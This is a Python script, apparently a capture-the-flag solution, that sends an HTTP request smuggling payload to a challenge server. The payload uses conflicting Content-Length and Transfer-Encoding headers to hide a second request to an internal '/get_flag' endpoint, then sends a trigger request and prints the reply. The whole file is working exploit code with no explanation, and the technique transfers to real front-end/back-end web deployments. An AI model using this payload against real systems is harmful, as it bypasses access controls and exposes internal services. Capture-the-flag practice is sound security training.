import socket

HOST = "chall1.lagncra.sh"
PORT = 14391

smuggle_payload = (
    "POST /submit_feedback HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Length: 42\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /get_flag HTTP/1.1\r\n"
    "Host: web\r\n"
    "\r\n"
)

trigger_request = (
    "GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "\r\n"
)

def recv_all(sock):
    sock.settimeout(2)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except:
        pass
    return data

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    print("[*] Sending smuggled request...")
    s.sendall(smuggle_payload.encode())

    print("[*] Sending trigger request...")
    s.sendall(trigger_request.encode())

    response = recv_all(s).decode(errors="ignore")
    print("\n[+] Server Response:\n")
    print(response)

    s.close()

if __name__ == "__main__":
    main()